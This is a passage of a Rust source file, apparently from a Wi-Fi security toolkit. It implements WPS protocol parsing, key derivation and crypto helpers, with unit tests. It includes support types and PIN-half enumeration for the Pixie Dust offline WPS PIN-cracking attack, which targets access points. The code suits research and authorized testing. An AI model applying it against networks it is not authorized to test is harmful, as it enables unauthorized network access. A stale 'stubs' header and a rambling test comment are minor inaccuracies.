    if data[5..8] != WFA_VENDOR_ID {
        return None;
    }

    // Verify SimpleConfig Vendor-Type
    if data[8..12] != WFA_VENDOR_TYPE_SIMPLECONFIG {
        return None;
    }

    let op_code = data[12];
    let flags = data[13];

    // WPS body starts at offset 14
    let body_end = length.min(data.len());
    let body = if body_end > 14 { &data[14..body_end] } else { &[] };

    Some(EapWscHeader {
        code,
        id,
        length: length as u16,
        op_code,
        flags,
        body,
    })
}

/// Parsed EAP-WSC header fields.
#[derive(Clone, Debug)]
pub struct EapWscHeader<'a> {
    /// EAP Code (1=Request, 2=Response, 3=Success, 4=Failure)
    pub code: u8,
    /// EAP Identifier
    pub id: u8,
    /// EAP Length (total packet length)
    pub length: u16,
    /// WSC OpCode (WSC_Start=1, WSC_ACK=2, WSC_NACK=3, WSC_MSG=4, WSC_Done=5, FRAG_ACK=6)
    pub op_code: u8,
    /// WSC flags (bit 0=More Fragments, bit 1=Length Field present)
    pub flags: u8,
    /// WPS TLV body (after EAP-WSC header)
    pub body: &'a [u8],
}

impl<'a> EapWscHeader<'a> {
    /// Returns true if more fragments follow.
    pub fn has_more_fragments(&self) -> bool {
        self.flags & wsc_flags::MORE_FRAGMENTS != 0
    }

    /// Returns true if the length field is present (first fragment).
    pub fn has_length_field(&self) -> bool {
        self.flags & wsc_flags::LENGTH_FIELD != 0
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Pixie Dust Support Types
// ═══════════════════════════════════════════════════════════════════════════════

/// Data needed for Pixie Dust offline WPS PIN cracking.
///
/// As Registrar, we collect this from the M1→M3 exchange:
/// - M1 (from AP/Enrollee): enrollee nonce, PKe, device info
/// - M2 (from us): registrar nonce, PKr
/// - M3 (from AP/Enrollee): E-Hash1, E-Hash2
///
/// The Pixie Dust attack exploits weak E-S1/E-S2 values in the AP's
/// WPS implementation. We brute force PIN halves against E-Hash1/E-Hash2
/// using predicted E-S1/E-S2 (zero, nonce-derived, etc.).
#[derive(Clone, Debug)]
pub struct PixieDustData {
    /// Enrollee nonce (from AP's M1)
    pub enrollee_nonce: [u8; 16],
    /// Registrar nonce (ours, from M2)
    pub registrar_nonce: [u8; 16],
    /// Enrollee DH public key (PKe, from AP's M1, 192 bytes)
    pub enrollee_public_key: Vec<u8>,
    /// Registrar DH public key (PKr, ours from M2, 192 bytes)
    pub registrar_public_key: Vec<u8>,
    /// E-Hash1 (from AP's M3)
    pub e_hash1: [u8; 32],
    /// E-Hash2 (from AP's M3)
    pub e_hash2: [u8; 32],
    /// AuthKey derived from DH exchange
    pub auth_key: Option<[u8; 32]>,
    /// E-SNonce1 decrypted from AP's M5 (optional, if we got that far)
    pub e_snonce1: Option<[u8; 16]>,
    /// E-SNonce2 decrypted from AP's M7 (optional)
    pub e_snonce2: Option<[u8; 16]>,
}

/// Build Pixie Dust data from the Registrar-side exchange.
///
/// As Registrar:
/// - enrollee_nonce, PKe come from AP's M1
/// - registrar_nonce, PKr are ours (from M2)
/// - E-Hash1, E-Hash2 come from AP's M3
pub fn build_pixie_dust_data(
    enrollee_nonce: [u8; 16],
    registrar_nonce: [u8; 16],
    enrollee_public_key: Vec<u8>,
    registrar_public_key: Vec<u8>,
    e_hash1: [u8; 32],
    e_hash2: [u8; 32],
    auth_key: [u8; 32],
) -> PixieDustData {
    PixieDustData {
        enrollee_nonce,
        registrar_nonce,
        enrollee_public_key,
        registrar_public_key,
        e_hash1,
        e_hash2,
        auth_key: Some(auth_key),
        e_snonce1: None,
        e_snonce2: None,
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS PIN Validation
// ═══════════════════════════════════════════════════════════════════════════════

/// Compute the WPS PIN checksum digit (8th digit) from the first 7 digits.
///
/// The WPS PIN checksum uses the Luhn-like algorithm specified in the WSC spec:
/// the 8-digit PIN must satisfy a weighted digit sum check.
///
/// Input: first 7 digits of the PIN as a u32 (0..9999999).
/// Returns: the checksum digit (0-9).
pub fn wps_pin_checksum(pin7: u32) -> u8 {
    let mut acc: u32 = 0;
    let mut tmp = pin7 * 10; // Make room for checksum digit

    while tmp > 0 {
        acc += 3 * (tmp % 10);
        tmp /= 10;
        acc += tmp % 10;
        tmp /= 10;
    }

    ((10 - (acc % 10)) % 10) as u8
}

/// Validate a full 8-digit WPS PIN checksum.
///
/// Returns true if the checksum digit (last digit) is correct.
pub fn wps_pin_valid(pin: u32) -> bool {
    if pin > 99_999_999 {
        return false;
    }
    let pin7 = pin / 10;
    let expected_check = wps_pin_checksum(pin7);
    let actual_check = (pin % 10) as u8;
    expected_check == actual_check
}

/// Generate a valid 8-digit WPS PIN from the first 7 digits.
///
/// Appends the correct checksum digit. Returns the full 8-digit PIN.
pub fn wps_pin_from_7(pin7: u32) -> u32 {
    let check = wps_pin_checksum(pin7) as u32;
    pin7 * 10 + check
}

/// Generate a full 8-digit WPS PIN from two halves (brute force enumeration).
///
/// In WPS, the PIN is split: first half = 4 digits (0-9999),
/// second half = 3 digits (0-999) + 1 checksum digit.
/// Total combinations: 10000 + 1000 = 11000 (not 10^8).
///
/// Returns the PIN as a zero-padded 8-character string.
pub fn wps_pin_from_halves(half1: u16, half2: u16) -> String {
    let pin7 = (half1 as u32) * 1000 + (half2 as u32);
    let check = wps_pin_checksum(pin7);
    format!("{:04}{:03}{}", half1, half2, check)
}

/// Split a WPS PIN string into its two halves for brute force.
///
/// Returns (first_half_str, second_half_str) where:
/// - first_half_str = first 4 ASCII digits
/// - second_half_str = last 4 ASCII digits
///
/// These are the values used in PSK1/PSK2 computation:
///   PSK1 = HMAC-SHA256(AuthKey, first_4_ascii_digits)
///   PSK2 = HMAC-SHA256(AuthKey, last_4_ascii_digits)
pub fn wps_pin_split(pin: &str) -> Option<(&str, &str)> {
    if pin.len() != 8 || !pin.chars().all(|c| c.is_ascii_digit()) {
        return None;
    }
    Some((&pin[..4], &pin[4..]))
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Crypto Stubs (placeholders — need a crypto crate for actual implementation)
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS key derivation result, produced by `wps_derive_keys()`.
#[derive(Clone, Debug)]
pub struct WpsSessionKeys {
    /// AuthKey (32 bytes) — used for HMAC computations in M3-M8
    pub auth_key: [u8; 32],
    /// KeyWrapKey (16 bytes) — AES key for encrypting/decrypting settings
    pub key_wrap_key: [u8; 16],
    /// EMSK (32 bytes) — Extended Master Session Key
    pub emsk: [u8; 32],
}

/// Derive WPS session keys from DH shared secret and nonces.
///
/// Algorithm (from WSC spec):
///   1. DHKey = SHA-256(DH_shared_secret)
///   2. KDK = HMAC-SHA-256(DHKey, N1 || MAC || N2)
///   3. Keys = KDF(KDK, "Wi-Fi Easy and Secure Key Derivation", 640)
///      → AuthKey(32) || KeyWrapKey(16) || EMSK(32)
///
///
pub fn wps_derive_keys(
    dh_shared_secret: &[u8],
    enrollee_nonce: &[u8; 16],
    mac_address: &[u8; 6],
    registrar_nonce: &[u8; 16],
) -> Option<WpsSessionKeys> {
    // 1. DHKey = SHA-256(DH_shared_secret)
    let dhkey: [u8; 32] = Sha256::digest(dh_shared_secret).into();

    // 2. KDK = HMAC-SHA-256(DHKey, N1 || MAC || N2)
    let mut concat = Vec::with_capacity(16 + 6 + 16);
    concat.extend_from_slice(enrollee_nonce);
    concat.extend_from_slice(mac_address);
    concat.extend_from_slice(registrar_nonce);
    let kdk = wps_hmac_sha256(&dhkey, &concat)?;

    // 3. Keys = KDF(KDK, "Wi-Fi Easy and Secure Key Derivation", 640)
    let keys = wps_kdf(&kdk, "Wi-Fi Easy and Secure Key Derivation", 640)?;

    // 4. Split: AuthKey(32) || KeyWrapKey(16) || EMSK(32)
    let mut auth_key = [0u8; 32];
    let mut key_wrap_key = [0u8; 16];
    let mut emsk = [0u8; 32];
    auth_key.copy_from_slice(&keys[0..32]);
    key_wrap_key.copy_from_slice(&keys[32..48]);
    emsk.copy_from_slice(&keys[48..80]);

    Some(WpsSessionKeys { auth_key, key_wrap_key, emsk })
}

/// Compute DH shared secret: peer_public_key ^ our_private_key mod p.
///
///
pub fn wps_dh_shared_secret(
    our_private_key: &[u8],
    peer_public_key: &[u8],
) -> Option<Vec<u8>> {
    let prime = BigUint::from_bytes_be(&DH_GROUP5_PRIME);
    let priv_key = BigUint::from_bytes_be(our_private_key);
    let pub_key = BigUint::from_bytes_be(peer_public_key);

    let shared = pub_key.modpow(&priv_key, &prime);
    let bytes = shared.to_bytes_be();

    // Pad to 192 bytes (big-endian, zero-pad on the left)
    let mut result = vec![0u8; 192];
    let offset = 192 - bytes.len();
    result[offset..].copy_from_slice(&bytes);

    Some(result)
}

/// Generate a DH keypair for WPS (Group 5, 1536-bit).
pub fn wps_dh_generate() -> Option<(Vec<u8>, Vec<u8>)> {
    // 1. Generate 192 random bytes for private key using OS CSPRNG
    let mut privkey = vec![0u8; 192];
    getrandom::getrandom(&mut privkey).ok()?;

    // 2. Clear top bit to ensure privkey < prime
    privkey[0] &= 0x7F;

    // 3. pubkey = g ^ privkey mod DH_GROUP5_PRIME (g = 2)
    let prime = BigUint::from_bytes_be(&DH_GROUP5_PRIME);
    let priv_bn = BigUint::from_bytes_be(&privkey);
    let generator = BigUint::from(DH_GROUP5_GENERATOR as u64);
    let pub_bn = generator.modpow(&priv_bn, &prime);
    let pub_bytes = pub_bn.to_bytes_be();

    // Pad public key to 192 bytes
    let mut pubkey = vec![0u8; 192];
    let offset = 192 - pub_bytes.len();
    pubkey[offset..].copy_from_slice(&pub_bytes);

    Some((privkey, pubkey))
}

/// WPS Key Derivation Function (NIST SP 800-108 CTR mode with HMAC-SHA-256).
///
/// Produces `out_bits` bits of key material using:
///   For i = 1..ceil(out_bits/256):
///     result_i = HMAC-SHA-256(key, i_be32 || label || out_bits_be32)
///
///
pub fn wps_kdf(
    key: &[u8],
    label: &str,
    out_bits: u32,
) -> Option<Vec<u8>> {
    let n_iters = (out_bits as usize + 255) / 256;
    let out_len = out_bits as usize / 8;
    let mut result = Vec::with_capacity(out_len);

    for i in 1..=n_iters {
        let i_be = (i as u32).to_be_bytes();
        let bits_be = out_bits.to_be_bytes();
        let hash = wps_hmac_sha256_multi(key, &[&i_be, label.as_bytes(), &bits_be])?;

        let remaining = out_len - result.len();
        let copy = remaining.min(32);
        result.extend_from_slice(&hash[..copy]);
    }

    Some(result)
}

/// Compute HMAC-SHA-256 for WPS authenticator and hash computations.
///
///
pub fn wps_hmac_sha256(
    key: &[u8],
    data: &[u8],
) -> Option<[u8; 32]> {
    let mut mac = HmacSha256::new_from_slice(key).ok()?;
    mac.update(data);
    let result = mac.finalize().into_bytes();
    Some(result.into())
}

/// Compute HMAC-SHA-256 over multiple concatenated buffers.
///
///
pub fn wps_hmac_sha256_multi(
    key: &[u8],
    buffers: &[&[u8]],
) -> Option<[u8; 32]> {
    let mut mac = HmacSha256::new_from_slice(key).ok()?;
    for buf in buffers {
        mac.update(buf);
    }
    let result = mac.finalize().into_bytes();
    Some(result.into())
}

/// AES-128-CBC decrypt (for decrypting Encrypted Settings from M4/M6/M8).
///
/// Input: key(16 bytes), IV(16 bytes), ciphertext.
///
pub fn wps_aes_decrypt(
    key: &[u8; 16],
    iv: &[u8],
    ciphertext: &[u8],
) -> Option<Vec<u8>> {
    // Input must be block-aligned (16 bytes)
    if ciphertext.len() % 16 != 0 || iv.len() < 16 {
        return None;
    }

    let iv_arr: [u8; 16] = iv[..16].try_into().ok()?;
    let decryptor = Decryptor::<Aes128>::new_from_slices(key, &iv_arr).ok()?;

    let mut buf = ciphertext.to_vec();
    // Decrypt in-place, block by block. No padding removal for WPS.
    let plaintext = decryptor
        .decrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buf)
        .ok()?;

    Some(plaintext.to_vec())
}

/// AES-128-CBC encrypt (for building Encrypted Settings in M5/M7).
///
/// Input: key(16 bytes), IV(16 bytes), plaintext (must be block-aligned).
///
pub fn wps_aes_encrypt(
    key: &[u8; 16],
    iv: &[u8],
    plaintext: &[u8],
) -> Option<Vec<u8>> {
    // Input must be block-aligned (16 bytes)
    if plaintext.len() % 16 != 0 || iv.len() < 16 {
        return None;
    }

    let iv_arr: [u8; 16] = iv[..16].try_into().ok()?;
    let encryptor = Encryptor::<Aes128>::new_from_slices(key, &iv_arr).ok()?;

    // Allocate buffer with enough space
    let mut buf = plaintext.to_vec();
    let ciphertext = encryptor
        .encrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buf, plaintext.len())
        .ok()?;

    Some(ciphertext.to_vec())
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helper: Build inner encrypted settings TLV blob (pre-encryption)
// ═══════════════════════════════════════════════════════════════════════════════

/// Build the plaintext inner TLV data for Encrypted Settings.
///
/// Contains a nonce TLV + Key Wrap Authenticator (KWA) TLV.
/// The KWA is the first 8 bytes of HMAC-SHA256(AuthKey, inner_TLVs_so_far).
///
/// The result needs to be padded to AES block size (16 bytes) and then
/// encrypted with AES-128-CBC using the KeyWrapKey.
///
/// `nonce_type`: attr::E_SNONCE1 (for M5) or attr::E_SNONCE2 (for M7).
/// `nonce`: the 16-byte nonce value.
/// `auth_key`: the 32-byte AuthKey for KWA computation.
///
/// Returns None if HMAC computation fails (crypto not available).
/// Returns the plaintext TLV data (before encryption, before padding).
pub fn build_encrypted_settings_inner(
    nonce_type: u16,
    nonce: &[u8; 16],
    auth_key: &[u8; 32],
) -> Option<Vec<u8>> {
    let mut inner = WpsTlvBuilder::new();
    inner.put(nonce_type, nonce);

    // KWA = first 8 bytes of HMAC-SHA256(auth_key, inner_so_far)
    let kwa_hmac = wps_hmac_sha256(auth_key, inner.as_bytes())?;
    inner.put(attr::KEY_WRAP_AUTHENTICATOR, &kwa_hmac[..8]);

    Some(inner.finish())
}

/// Pad plaintext to AES block size (16 bytes) with zero padding.
pub fn pad_to_aes_block(data: &[u8]) -> Vec<u8> {
    let padded_len = (data.len() + 15) & !15;
    let mut padded = data.to_vec();
    padded.resize(padded_len, 0);
    padded
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── TLV parsing tests ──

    #[test]
    fn test_tlv_iterator_basic() {
        // Build: Version(0x104A) = 0x10, MsgType(0x1022) = 0x04
        let data = [
            0x10, 0x4A, 0x00, 0x01, 0x10, // Version = 0x10
            0x10, 0x22, 0x00, 0x01, 0x04, // MsgType = M1 (0x04)
        ];

        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(&data).collect();
        assert_eq!(tlvs.len(), 2);

        assert_eq!(tlvs[0].attr_type, attr::VERSION);
        assert_eq!(tlvs[0].as_u8(), Some(0x10));

        assert_eq!(tlvs[1].attr_type, attr::MSG_TYPE);
        assert_eq!(tlvs[1].as_u8(), Some(0x04));
    }

    #[test]
    fn test_tlv_iterator_u16_value() {
        // Config Methods = 0x018C
        let data = [0x10, 0x08, 0x00, 0x02, 0x01, 0x8C];

        let tlv = WpsTlvIterator::new(&data).next().unwrap();
        assert_eq!(tlv.attr_type, attr::CONFIG_METHODS);
        assert_eq!(tlv.as_u16(), Some(0x018C));
    }

    #[test]
    fn test_tlv_iterator_string_value() {
        let name = "TestDevice";
        let name_bytes = name.as_bytes();
        let len = name_bytes.len() as u16;
        let mut data = Vec::new();
        data.extend_from_slice(&attr::DEVICE_NAME.to_be_bytes());
        data.extend_from_slice(&len.to_be_bytes());
        data.extend_from_slice(name_bytes);

        let tlv = WpsTlvIterator::new(&data).next().unwrap();
        assert_eq!(tlv.attr_type, attr::DEVICE_NAME);
        assert_eq!(tlv.as_string(), "TestDevice");
    }

    #[test]
    fn test_tlv_iterator_empty() {
        let data: &[u8] = &[];
        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(data).collect();
        assert_eq!(tlvs.len(), 0);
    }

    #[test]
    fn test_tlv_iterator_truncated_header() {
        // Only 3 bytes — not enough for type(2) + length(2)
        let data = [0x10, 0x4A, 0x00];
        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(&data).collect();
        assert_eq!(tlvs.len(), 0);
    }

    #[test]
    fn test_tlv_iterator_truncated_value() {
        // Claims length 4 but only 2 bytes of value follow
        let data = [0x10, 0x4A, 0x00, 0x04, 0x10, 0x20];
        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(&data).collect();
        assert_eq!(tlvs.len(), 0); // Should stop — malformed
    }

    #[test]
    fn test_tlv_find() {
        let data = [
            0x10, 0x4A, 0x00, 0x01, 0x10, // Version
            0x10, 0x22, 0x00, 0x01, 0x04, // MsgType
            0x10, 0x08, 0x00, 0x02, 0x01, 0x8C, // ConfigMethods
        ];

        assert_eq!(tlv_find(&data, attr::VERSION), Some(&[0x10u8][..]));
        assert_eq!(tlv_find(&data, attr::MSG_TYPE), Some(&[0x04u8][..]));
        assert_eq!(tlv_find(&data, attr::CONFIG_METHODS), Some(&[0x01u8, 0x8C][..]));
        assert_eq!(tlv_find(&data, attr::DEVICE_NAME), None);
    }

    // ── TLV builder tests ──

    #[test]
    fn test_tlv_builder_u8() {
        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        let bytes = b.finish();

        assert_eq!(bytes, &[0x10, 0x4A, 0x00, 0x01, 0x10]);
    }

    #[test]
    fn test_tlv_builder_u16() {
        let mut b = WpsTlvBuilder::new();
        b.put_u16(attr::CONFIG_METHODS, 0x018C);
        let bytes = b.finish();

        assert_eq!(bytes, &[0x10, 0x08, 0x00, 0x02, 0x01, 0x8C]);
    }

    #[test]
    fn test_tlv_builder_roundtrip() {
        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        b.put_u8(attr::MSG_TYPE, 0x04);
        b.put_u16(attr::CONFIG_METHODS, 0x018C);
        b.put_str(attr::DEVICE_NAME, "Test");
        let bytes = b.finish();

        // Parse back
        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(&bytes).collect();
        assert_eq!(tlvs.len(), 4);
        assert_eq!(tlvs[0].as_u8(), Some(0x10));
        assert_eq!(tlvs[1].as_u8(), Some(0x04));
        assert_eq!(tlvs[2].as_u16(), Some(0x018C));
        assert_eq!(tlvs[3].as_string(), "Test");
    }

    #[test]
    fn test_tlv_builder_u32() {
        let mut b = WpsTlvBuilder::new();
        b.put_u32(attr::OS_VERSION, 0x80000000);
        let bytes = b.finish();

        assert_eq!(bytes, &[0x10, 0x2D, 0x00, 0x04, 0x80, 0x00, 0x00, 0x00]);

        let tlv = WpsTlvIterator::new(&bytes).next().unwrap();
        assert_eq!(tlv.as_u32(), Some(0x80000000));
    }

    // ── WPS message type tests ──

    #[test]
    fn test_wps_message_type_from_u8() {
        assert_eq!(WpsMessageType::from_u8(0x04), Some(WpsMessageType::M1));
        assert_eq!(WpsMessageType::from_u8(0x05), Some(WpsMessageType::M2));
        assert_eq!(WpsMessageType::from_u8(0x0E), Some(WpsMessageType::WscNack));
        assert_eq!(WpsMessageType::from_u8(0x0F), Some(WpsMessageType::WscDone));
        assert_eq!(WpsMessageType::from_u8(0x00), None);
        assert_eq!(WpsMessageType::from_u8(0xFF), None);
    }

    #[test]
    fn test_wps_message_type_values_match_c() {
        // Verify our values match the C WIFIKIT_WPS_MSG_TYPE constants
        assert_eq!(WpsMessageType::M1 as u8, 0x04);
        assert_eq!(WpsMessageType::M2 as u8, 0x05);
        assert_eq!(WpsMessageType::M2D as u8, 0x06);
        assert_eq!(WpsMessageType::M3 as u8, 0x07);
        assert_eq!(WpsMessageType::M4 as u8, 0x08);
        assert_eq!(WpsMessageType::M5 as u8, 0x09);
        assert_eq!(WpsMessageType::M6 as u8, 0x0A);
        assert_eq!(WpsMessageType::M7 as u8, 0x0B);
        assert_eq!(WpsMessageType::M8 as u8, 0x0C);
        assert_eq!(WpsMessageType::WscAck as u8, 0x0D);
        assert_eq!(WpsMessageType::WscNack as u8, 0x0E);
        assert_eq!(WpsMessageType::WscDone as u8, 0x0F);
    }

    // ── WPS state tests ──

    #[test]
    fn test_wps_state_from_u8() {
        assert_eq!(WpsState::from_u8(0), WpsState::None);
        assert_eq!(WpsState::from_u8(1), WpsState::NotConfigured);
        assert_eq!(WpsState::from_u8(2), WpsState::Configured);
        assert_eq!(WpsState::from_u8(99), WpsState::None);
    }

    // ── PIN validation tests ──

    #[test]
    fn test_wps_pin_checksum_known_pins() {
        // The WPS checksum algorithm (Luhn-like weighted digit sum):
        //   For pin7=1234567, tmp=12345670:
        //   3*0+7=7, 3*6+5=23, 3*4+3=15, 3*2+1=7 → sum=52 → check=(10-52%10)%10=8
        assert_eq!(wps_pin_checksum(1234567), 8);
        assert!(wps_pin_valid(12345678));

        // PIN 00000000: first 7 = 0000000, checksum = 0
        assert_eq!(wps_pin_checksum(0), 0);
        assert!(wps_pin_valid(0));

        // Another known PIN: 46264848 (common default)
        // pin7 = 4626484, tmp = 46264840
        // 3*0+4=4, 3*8+4=28, 3*6+2=20, 3*6+4=22 → sum=74 → check=(10-4)%10=6
        // wait — let me just verify it computes correctly
        let pin7: u32 = 4626484;
        let chk = wps_pin_checksum(pin7);
        let full_pin = pin7 * 10 + chk as u32;
        assert!(wps_pin_valid(full_pin));
    }

    #[test]
    fn test_wps_pin_valid_rejects_bad_checksum() {
        // 12345670 has wrong checksum (should be 8, not 0)
        assert!(!wps_pin_valid(12345670));
        // Out of range
        assert!(!wps_pin_valid(100_000_000));
    }

    #[test]
    fn test_wps_pin_from_7() {
        assert_eq!(wps_pin_from_7(1234567), 12345678);
        assert_eq!(wps_pin_from_7(0), 0);
    }

    #[test]
    fn test_wps_pin_from_halves() {
        // half1=1234, half2=567 → 7-digit = 1234567, checksum = 8 → "12345678"
        let pin = wps_pin_from_halves(1234, 567);
        assert_eq!(pin, "12345678");
        assert_eq!(pin.len(), 8);

        // Verify the generated PIN is valid
        let pin_num: u32 = pin.parse().unwrap();
        assert!(wps_pin_valid(pin_num));
    }

    #[test]
    fn test_wps_pin_from_halves_zero() {
        let pin = wps_pin_from_halves(0, 0);
        assert_eq!(pin, "00000000");
        assert!(wps_pin_valid(pin.parse().unwrap()));
    }

    #[test]
    fn test_wps_pin_split() {
        let (h1, h2) = wps_pin_split("12345670").unwrap();
        assert_eq!(h1, "1234");
        assert_eq!(h2, "5670");

        // Invalid PINs
        assert!(wps_pin_split("1234567").is_none()); // too short
        assert!(wps_pin_split("123456789").is_none()); // too long
        assert!(wps_pin_split("1234567a").is_none()); // non-digit
    }

    #[test]
    fn test_wps_pin_all_halves_produce_valid_pins() {
        // Verify a sample of half combinations produce valid PINs
        for h1 in [0u16, 1, 999, 5000, 9999] {
            for h2 in [0u16, 1, 500, 999] {
                let pin_str = wps_pin_from_halves(h1, h2);
                let pin_num: u32 = pin_str.parse().unwrap();
                assert!(wps_pin_valid(pin_num), "Invalid PIN from halves ({}, {}): {}", h1, h2, pin_str);
            }
        }
    }

    // ── WPS IE parser tests ──

    #[test]
    fn test_parse_wps_ie_basic() {
        // Build a minimal WPS IE body with Version + State
        let mut data = Vec::new();
        // Version = 0x10
        data.extend_from_slice(&[0x10, 0x4A, 0x00, 0x01, 0x10]);
        // WPS State = Configured (2)
        data.extend_from_slice(&[0x10, 0x44, 0x00, 0x01, 0x02]);
        // Device Name = "TestAP"
        let name = b"TestAP";
        data.extend_from_slice(&0x1011u16.to_be_bytes());
        data.extend_from_slice(&(name.len() as u16).to_be_bytes());
        data.extend_from_slice(name);

        let info = parse_wps_ie(&data).unwrap();
        assert_eq!(info.version, 0x10);
        assert_eq!(info.state, WpsState::Configured);
        assert_eq!(info.device_name, "TestAP");
    }

    #[test]
    fn test_parse_wps_ie_locked() {
        let mut data = Vec::new();
        // Version
        data.extend_from_slice(&[0x10, 0x4A, 0x00, 0x01, 0x10]);
        // AP Setup Locked = 1
        data.extend_from_slice(&[0x10, 0x57, 0x00, 0x01, 0x01]);

        let info = parse_wps_ie(&data).unwrap();
        assert!(info.locked);
    }

    #[test]
    fn test_parse_wps_ie_empty() {
        assert!(parse_wps_ie(&[]).is_none());
        assert!(parse_wps_ie(&[0x00, 0x01]).is_none());
    }

    // ── WPS message parser tests ──

    #[test]
    fn test_parse_wps_message_m1() {
        let nonce = [0x11u8; 16];
        let pubkey = vec![0xAA; 192];

        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        b.put_u8(attr::MSG_TYPE, WpsMessageType::M1 as u8);
        b.put(attr::ENROLLEE_NONCE, &nonce);
        b.put(attr::PUBLIC_KEY, &pubkey);
        b.put_u16(attr::AUTH_TYPE_FLAGS, 0x0023);
        b.put_str(attr::DEVICE_NAME, "Enrollee");
        let data = b.finish();

        let msg = parse_wps_message(&data).unwrap();
        assert_eq!(msg.msg_type, WpsMessageType::M1);
        assert_eq!(msg.enrollee_nonce, Some(nonce));
        assert_eq!(msg.public_key, Some(pubkey));
        assert_eq!(msg.device_info.auth_type_flags, 0x0023);
        assert_eq!(msg.device_info.device_name, "Enrollee");
    }

    #[test]
    fn test_parse_wps_message_m2() {
        let e_nonce = [0x11u8; 16];
        let r_nonce = [0x22u8; 16];
        let pubkey = vec![0xBB; 192];

        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        b.put_u8(attr::MSG_TYPE, WpsMessageType::M2 as u8);
        b.put(attr::ENROLLEE_NONCE, &e_nonce);
        b.put(attr::REGISTRAR_NONCE, &r_nonce);
        b.put(attr::PUBLIC_KEY, &pubkey);
        b.put_str(attr::MANUFACTURER, "TestMfg");
        b.put_str(attr::MODEL_NAME, "TestModel");
        let data = b.finish();

        let msg = parse_wps_message(&data).unwrap();
        assert_eq!(msg.msg_type, WpsMessageType::M2);
        assert_eq!(msg.enrollee_nonce, Some(e_nonce));
        assert_eq!(msg.registrar_nonce, Some(r_nonce));
        assert_eq!(msg.public_key, Some(pubkey));
        assert_eq!(msg.device_info.manufacturer, "TestMfg");
        assert_eq!(msg.device_info.model_name, "TestModel");
    }

    #[test]
    fn test_parse_wps_message_m4_with_hashes() {
        let r_hash1 = [0xAA; 32];
        let r_hash2 = [0xBB; 32];

        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        b.put_u8(attr::MSG_TYPE, WpsMessageType::M4 as u8);
        b.put(attr::REGISTRAR_NONCE, &[0x22; 16]);
        b.put(attr::R_HASH1, &r_hash1);
        b.put(attr::R_HASH2, &r_hash2);
        b.put(attr::ENCRYPTED_SETTINGS, &[0xCC; 48]);
        let data = b.finish();

        let msg = parse_wps_message(&data).unwrap();
        assert_eq!(msg.msg_type, WpsMessageType::M4);
        assert_eq!(msg.r_hash1, Some(r_hash1));
        assert_eq!(msg.r_hash2, Some(r_hash2));
        assert!(msg.encrypted_settings.is_some());
        assert_eq!(msg.encrypted_settings.unwrap().len(), 48);
    }

    #[test]
    fn test_parse_wps_message_nack() {
        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        b.put_u8(attr::MSG_TYPE, WpsMessageType::WscNack as u8);
        b.put(attr::ENROLLEE_NONCE, &[0x11; 16]);
        b.put(attr::REGISTRAR_NONCE, &[0x22; 16]);
        b.put_u16(attr::CONFIG_ERROR, config_error::SETUP_LOCKED);
        let data = b.finish();

        let msg = parse_wps_message(&data).unwrap();
        assert_eq!(msg.msg_type, WpsMessageType::WscNack);
        assert_eq!(msg.config_error, Some(config_error::SETUP_LOCKED));
    }

    #[test]
    fn test_parse_wps_message_no_msg_type() {
        // Missing MSG_TYPE TLV → should return None
        let mut b = WpsTlvBuilder::new();
        b.put_u8(attr::VERSION, 0x10);
        let data = b.finish();

        assert!(parse_wps_message(&data).is_none());
    }

    // ── WPS message builder tests ──

    #[test]
    fn test_build_m1_roundtrip() {
        let params = WpsM1Params {
            enrollee_nonce: [0x11; 16],
            mac_address: [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF],
            public_key: vec![0x42; 192],
            uuid_e: [0x55; 16],
            ..WpsM1Params::default()
        };

        let data = build_m1(&params);

        // Parse it back
        let msg = parse_wps_message(&data).unwrap();
        assert_eq!(msg.msg_type, WpsMessageType::M1);
        assert_eq!(msg.enrollee_nonce, Some([0x11; 16]));
        assert_eq!(msg.public_key, Some(vec![0x42; 192]));
        assert_eq!(msg.device_info.device_name, "WPS Client");
        assert_eq!(msg.device_info.manufacturer, "Broadcom");
    }

    #[test]
    fn test_build_wsc_nack_roundtrip() {
        let e_nonce = [0x11u8; 16];
        let r_nonce = [0x22u8; 16];

        let data = build_wsc_nack(&e_nonce, &r_nonce, config_error::NO_ERROR);
        let msg = parse_wps_message(&data).unwrap();

        assert_eq!(msg.msg_type, WpsMessageType::WscNack);
        assert_eq!(msg.enrollee_nonce, Some(e_nonce));
        assert_eq!(msg.registrar_nonce, Some(r_nonce));
        assert_eq!(msg.config_error, Some(config_error::NO_ERROR));
    }

    #[test]
    fn test_build_wsc_done_roundtrip() {
        let e_nonce = [0x11u8; 16];
        let r_nonce = [0x22u8; 16];

        let data = build_wsc_done(&e_nonce, &r_nonce);
        let msg = parse_wps_message(&data).unwrap();

        assert_eq!(msg.msg_type, WpsMessageType::WscDone);
        assert_eq!(msg.enrollee_nonce, Some(e_nonce));
        assert_eq!(msg.registrar_nonce, Some(r_nonce));
    }

    #[test]
    fn test_build_wsc_ack_roundtrip() {
        let e_nonce = [0x33u8; 16];
        let r_nonce = [0x44u8; 16];

        let data = build_wsc_ack(&e_nonce, &r_nonce);
        let msg = parse_wps_message(&data).unwrap();

        assert_eq!(msg.msg_type, WpsMessageType::WscAck);
        assert_eq!(msg.enrollee_nonce, Some(e_nonce));
        assert_eq!(msg.registrar_nonce, Some(r_nonce));
    }

    // ── EAP-WSC frame tests ──

    #[test]
